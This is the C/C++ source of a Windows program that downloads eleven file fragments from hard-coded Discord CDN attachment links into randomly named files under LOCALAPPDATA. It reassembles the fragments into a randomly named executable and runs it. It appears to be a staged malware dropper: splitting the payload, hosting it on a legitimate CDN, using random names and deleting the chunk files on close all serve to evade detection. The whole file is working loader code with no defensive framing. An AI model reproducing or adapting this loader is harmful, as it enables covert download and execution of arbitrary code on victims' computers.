#include <Windows.h>
#include <stdio.h>
#include <conio.h>

#define IsCharacterAnInteger isdigit
#define ConvertStringToInteger atoi

PBYTE g_BinaryBuffer = NULL;
DWORD g_FractionTotal = 0;

SIZE_T StringLengthW(LPCWSTR String)
{
	LPCWSTR String2;

	for (String2 = String; *String2; ++String2);

	return (String2 - String);
}

PWCHAR StringCopyW(PWCHAR String1, PWCHAR String2)
{
	PWCHAR p = String1;

	while ((*p++ = *String2++) != 0);

	return String1;
}

PWCHAR StringConcatW(PWCHAR String, PWCHAR String2)
{
	StringCopyW(&String[StringLengthW(String)], String2);

	return String;
}

ULONG Next = 2; //seed

INT PseudoRandomIntegerSubroutine(PULONG Context)
{
	return ((*Context = *Context * 1103515245 + 12345) % ((ULONG)RAND_MAX + 1));
}

INT CreatePseudoRandomInteger(VOID)
{
	return PseudoRandomIntegerSubroutine(&Next);
}

PCHAR CreatePseudoRandomStringW(SIZE_T dwLength)
{
	WCHAR DataSet[] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	PWCHAR String = NULL;

	String = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (sizeof(WCHAR) * (dwLength + 1)));
	if (String == NULL)
		return NULL;

#pragma warning (push)
#pragma warning (disable: 4018)
	for (INT dwN = 0; dwN < dwLength; dwN++)
	{
		INT Key = CreatePseudoRandomInteger() % (INT)(StringLengthW(DataSet) - 1);
		String[dwN] = DataSet[Key];
	}
#pragma warning (pop)

#pragma warning (push)
#pragma warning (disable: 6386)
	String[dwLength] = '\0';
#pragma warning (pop)

	return (PCHAR)String;
}

DWORD Win32FromHResult(HRESULT Result)
{
	if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
		return HRESULT_CODE(Result);

	if (Result == S_OK)
		return ERROR_SUCCESS;

	return ERROR_CAN_NOT_COMPLETE;
}

BOOL DownloadFractionFromDiscordCDN(PWCHAR Url)
{
	return TRUE;
}

LONGLONG GetFileSizeFromPathDisposeHandleW(PWCHAR Path, DWORD dwFlagsAndAttributes)
{
	LARGE_INTEGER LargeInteger;
	HANDLE hHandle = INVALID_HANDLE_VALUE;

	hHandle = CreateFileW(Path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, dwFlagsAndAttributes, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		return INVALID_FILE_SIZE;

	if (GetFileSizeEx(hHandle, &LargeInteger))
	{
		if (hHandle)
			CloseHandle(hHandle);

		return LargeInteger.QuadPart;
	}

	return INVALID_FILE_SIZE;
}

DWORD UrlDownloadToFileSynchronousW(PWCHAR Url, PWCHAR SavePath)
{
	typedef HRESULT(WINAPI* URLDOWNLOADFILE)(LPUNKNOWN, LPCTSTR, LPCTSTR, DWORD, LPBINDSTATUSCALLBACK);
	class DownloadProgressRoutine : public IBindStatusCallback {
	private:
		BOOL AbortOperation = FALSE;
		BOOL OperationCompleted = FALSE;
		DWORD dwFileSize = ERROR_SUCCESS;
	public:
		HRESULT __stdcall QueryInterface(const IID&, void**) { return E_NOINTERFACE; }
		ULONG STDMETHODCALLTYPE AddRef(void) { return 1; }
		ULONG STDMETHODCALLTYPE Release(void) { return 1; }
		HRESULT STDMETHODCALLTYPE OnStartBinding(DWORD dwReserved, IBinding* pib) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE GetPriority(LONG* pnPriority) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE OnLowResource(DWORD reserved) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE OnStopBinding(HRESULT hresult, LPCWSTR szError) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE GetBindInfo(DWORD* grfBINDF, BINDINFO* pbindinfo) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE OnDataAvailable(DWORD grfBSCF, DWORD dwSize, FORMATETC* pformatetc, STGMEDIUM* pstgmed) { return E_NOTIMPL; }
		virtual HRESULT STDMETHODCALLTYPE OnObjectAvailable(REFIID riid, IUnknown* punk) { return E_NOTIMPL; }
		virtual BOOL STDMETHODCALLTYPE IsDownloadComplete(VOID)
		{
			return OperationCompleted;
		}
		virtual HRESULT STDMETHODCALLTYPE AbortDownload(VOID)
		{
			AbortOperation = TRUE;
			return E_NOTIMPL;
		}
		virtual DWORD STDMETHODCALLTYPE GetServerReportedFileSize(VOID)
		{
			return dwFileSize;
		}
		virtual HRESULT __stdcall OnProgress(ULONG ulProgress, ULONG ulProgressMax, ULONG ulStatusCode, LPCWSTR szStatusText)
		{
			if (ulProgress == ulProgressMax)
				OperationCompleted = TRUE;

			dwFileSize = ulProgressMax;

			if (AbortOperation)
				return E_ABORT;

			return S_OK;
		}
	};

	HRESULT Result = S_OK;
	DownloadProgressRoutine DownloadCallback;
	DWORD dwError = ERROR_SUCCESS;
	URLDOWNLOADFILE UrlDownloadToFileW = NULL;
	HMODULE Urlmon;
	BOOL bFlag = FALSE;

	Urlmon = LoadLibraryW(L"Urlmon.dll");
	if (Urlmon == NULL)
		goto EXIT_ROUTINE;

	UrlDownloadToFileW = (URLDOWNLOADFILE)GetProcAddress(Urlmon, "URLDownloadToFileW");
	if (!UrlDownloadToFileW)
		goto EXIT_ROUTINE;

	Result = UrlDownloadToFileW(0, Url, SavePath, 0, (IBindStatusCallback*)(&DownloadCallback));
	if (Result != S_OK)
		goto EXIT_ROUTINE;

	while (!DownloadCallback.IsDownloadComplete())
	{
		Sleep(100);
	}

	dwError = GetFileSizeFromPathDisposeHandleW(SavePath, FILE_ATTRIBUTE_NORMAL);
	if (dwError == INVALID_FILE_SIZE)
		goto EXIT_ROUTINE;

	g_FractionTotal += dwError;

	if (DownloadCallback.GetServerReportedFileSize() != dwError)
		goto EXIT_ROUTINE;

	bFlag = TRUE;
	dwError = ERROR_SUCCESS;

EXIT_ROUTINE:
	if (!bFlag)
	{
		if (Result != S_OK)
			dwError = Win32FromHResult(Result);
		else
			dwError = GetLastError();
	}

	if (Urlmon)
		FreeLibrary(Urlmon);

	return dwError;
}

VOID ByteArrayToCharArrayA(PCHAR Char, PBYTE Byte, DWORD Length)
{
	for (DWORD dwX = 0; dwX < Length; dwX++)
	{
		Char[dwX] = (BYTE)Byte[dwX];
	}
}

BOOL IsPathValidW(PWCHAR FilePath)
{
	HANDLE hFile = INVALID_HANDLE_VALUE;

	hFile = CreateFileW(FilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;

	if (hFile)
		CloseHandle(hFile);

	return TRUE;
}

BOOL GetFractionedOrdinal(PWCHAR Path, DWORD Ordinal)
{
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	CHAR CharString[32] = { 0 };
	CHAR OffsetInteger[3] = { 0 }; DWORD dwOffset = 0;
	INT Offset;
	BYTE Buffer[32] = { 0 };

	if (!IsPathValidW(Path))
		return -1;

	hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		return -1;

	if (!ReadFile(hHandle, Buffer, 32, NULL, NULL))
	{
		CloseHandle(hHandle);
		return -1;
	}

	ByteArrayToCharArrayA(CharString, Buffer, 32);

	for (DWORD dwX = 0; dwX < 32; dwX++)
	{
		if (CharString[dwX] == ' ' || CharString[dwX] == '<' || CharString[dwX] == '>')
			continue;

		if (CharString[dwX] >= '0' && CharString[dwX] <= '9')
		{
			if (IsCharacterAnInteger((UCHAR)CharString[dwX]))
			{
				OffsetInteger[dwOffset] = CharString[dwX];
				dwOffset++;
			}
		}
	}

	Offset = ConvertStringToInteger(OffsetInteger);
	if (hHandle)
		CloseHandle(hHandle);

	return (Offset == Ordinal ? TRUE : FALSE);
}

BOOL LoadFractionIntoBuffer(PWCHAR Path, DWORD Ordinal, DWORD bytesToRead)
{
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	BOOL bFlag = FALSE;
	BYTE FractionBuffer[1024] = { 0 };
	DWORD dwRead = 0;
	DWORD offset = 0;

	hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	if (SetFilePointer(hHandle, 32, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
		goto EXIT_ROUTINE;

	if (!ReadFile(hHandle, FractionBuffer, bytesToRead, &dwRead, NULL) || dwRead != bytesToRead)
		goto EXIT_ROUTINE;

	offset = Ordinal * 1024;
	CopyMemory(g_BinaryBuffer + offset, FractionBuffer, bytesToRead);

	bFlag = TRUE;

EXIT_ROUTINE:
	if (hHandle)
		CloseHandle(hHandle);

	return bFlag;
}

BOOL LoadFractionDirectly(PWCHAR Path, DWORD offset, DWORD bytesToRead)
{
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	BOOL bFlag = FALSE;
	PBYTE FractionBuffer = NULL;
	DWORD dwRead = 0;

	hHandle = CreateFileW(Path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_DELETE_ON_CLOSE, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	// Allocate buffer for the file size
	FractionBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytesToRead);
	if (!FractionBuffer)
		goto EXIT_ROUTINE;

	// Skip the 32-byte header containing the ordinal marker
	if (SetFilePointer(hHandle, 32, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
		goto EXIT_ROUTINE;

	if (!ReadFile(hHandle, FractionBuffer, bytesToRead, &dwRead, NULL))
		goto EXIT_ROUTINE;

	CopyMemory(g_BinaryBuffer + offset, FractionBuffer, dwRead);

	bFlag = TRUE;

EXIT_ROUTINE:
	if (FractionBuffer)
		HeapFree(GetProcessHeap(), 0, FractionBuffer);

	if (hHandle)
		CloseHandle(hHandle);

	return bFlag;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
	WCHAR DiscordCdnFractionArray[11][182]{
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841996469702707/Fraction0?ex=68d33a67&is=68d1e8e7&hm=56024786ddc10069eb3eef8ae03d3a666d2b3558cb52591b3d6a16a6f92f5234&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841996851380316/Fraction1?ex=68d33a67&is=68d1e8e7&hm=3a76d9d8c32abe39cb08bfe8eeaa90d0a4862e0c96822ebd552671dfb0c66a57&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841997245779988/Fraction2?ex=68d33a67&is=68d1e8e7&hm=d3cc3501b6af9b9ec6b51e5428228ee98dd440b31cac0fe846113608707d7080&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841997677531196/Fraction3?ex=68d33a67&is=68d1e8e7&hm=c7f1346be52a7caaae0d20679ff3c82f0923ff7db274e7c6f916a5cde45db0a7&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841997987905576/Fraction4?ex=68d33a67&is=68d1e8e7&hm=746abb3aa98b022880a79eed5f32299314e613b360eb710aaf7595676f8c1504&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841998528974969/Fraction5?ex=68d33a67&is=68d1e8e7&hm=db3ca8474522736078a06ddd0f649dad1c626176ab7dd110ee6c562982980773&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841999145664612/Fraction6?ex=68d33a67&is=68d1e8e7&hm=87ae7abd755980c775eadabd70e63a6eeebef0fa45987a9e9f1bfc42bde7d637&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841999632207902/Fraction7?ex=68d33a68&is=68d1e8e8&hm=78e8f049f581844023a3f905b2cc4ddcc393f496fded687a3e3d28f0055bb672&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419842000093577307/Fraction8?ex=68d33a68&is=68d1e8e8&hm=8e1ec186bfe1d160880a861a009dbfb817921eaf3bb8a02446c15411d519514e&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419841996180291584/Fraction9?ex=68d33a67&is=68d1e8e7&hm=573ddac03bcce211f64b71e70d552b0fbcee0bfa4b318f9ba54106ecb178507f&",
		L"https://cdn.discordapp.com/attachments/687156159165366282/1419842020197007390/Fraction10?ex=68d33a6d&is=68d1e8ed&hm=3e24850a55659a6743294557bae0d867c02a826a3976e7f215b88992164afb12&"
	};

	BOOL bFlag = FALSE;
	DWORD dwError = ERROR_SUCCESS;
	WCHAR FractionPaths[11][MAX_PATH * sizeof(WCHAR)] = { 0 };
	WCHAR BinaryExecutionPath[MAX_PATH * sizeof(WCHAR)] = { 0 };
	HANDLE hHandle = INVALID_HANDLE_VALUE;
	PROCESS_INFORMATION Pi; ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
	STARTUPINFOEXW Si; ZeroMemory(&Si, sizeof(STARTUPINFOEXW));
	DWORD chunkSize = 0;
	DWORD numChunks = 0;
	DWORD actualBinarySize = 0;
	DWORD currentOffset = 0;

	for (DWORD dwX = 0; dwX < 11; dwX++)
	{
		if (GetEnvironmentVariableW(L"LOCALAPPDATA", FractionPaths[dwX], MAX_PATH * sizeof(WCHAR)) == 0)
			goto EXIT_ROUTINE;

		Next++;
		StringConcatW(FractionPaths[dwX], (PWCHAR)L"\\");
		StringConcatW(FractionPaths[dwX], (PWCHAR)CreatePseudoRandomStringW(5));
		StringConcatW(FractionPaths[dwX], (PWCHAR)L".br");
		Sleep(1);
	}
	
	for (DWORD dwX = 0; dwX < 11; dwX++)
	{
		if (UrlDownloadToFileSynchronousW(DiscordCdnFractionArray[dwX], FractionPaths[dwX]) != ERROR_SUCCESS)
			goto EXIT_ROUTINE;

		Sleep(1000); // don't make discord mad :(
	}

	g_BinaryBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_FractionTotal + 1024); // offset
	if (g_BinaryBuffer == NULL)
		goto EXIT_ROUTINE;

	chunkSize = 1024;
	numChunks = 11;

	actualBinarySize = g_FractionTotal - (numChunks * 32);

	for (DWORD dwX = 0; dwX < numChunks; dwX++)
	{
		LONGLONG fileSize = GetFileSizeFromPathDisposeHandleW(FractionPaths[dwX], FILE_ATTRIBUTE_NORMAL);
		if (fileSize == INVALID_FILE_SIZE)
			goto EXIT_ROUTINE;

		DWORD actualDataSize = (DWORD)fileSize - 32; // subtract header size

		if (!LoadFractionDirectly(FractionPaths[dwX], currentOffset, actualDataSize))
			goto EXIT_ROUTINE;

		currentOffset += actualDataSize;
	}

	actualBinarySize = currentOffset;

	if (GetEnvironmentVariableW(L"LOCALAPPDATA", BinaryExecutionPath, MAX_PATH * sizeof(WCHAR)) == 0)
		goto EXIT_ROUTINE;

	Next++;
	StringConcatW(BinaryExecutionPath, (PWCHAR)L"\\");
	StringConcatW(BinaryExecutionPath, (PWCHAR)CreatePseudoRandomStringW(5));
	StringConcatW(BinaryExecutionPath, (PWCHAR)L".exe");

	hHandle = CreateFileW(BinaryExecutionPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hHandle == INVALID_HANDLE_VALUE)
		goto EXIT_ROUTINE;

	dwError = ERROR_SUCCESS;
	if (WriteFile(hHandle, g_BinaryBuffer, actualBinarySize, &dwError, NULL))
	{
		if (hHandle)
			CloseHandle(hHandle);

		if (!CreateProcessW(BinaryExecutionPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &Si.StartupInfo, &Pi))
			goto EXIT_ROUTINE;

		WaitForSingleObject(Pi.hProcess, INFINITE);
	}
	else
	{
		if (hHandle)
			CloseHandle(hHandle);
		goto EXIT_ROUTINE;
	}

	bFlag = TRUE;

EXIT_ROUTINE:
	if (!bFlag)
		dwError = GetLastError();

	if (g_BinaryBuffer)
		HeapFree(GetProcessHeap(), HEAP_ZERO_MEMORY, g_BinaryBuffer);

	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);

	if (Pi.hThread)
		CloseHandle(Pi.hThread);

	return dwError;
}
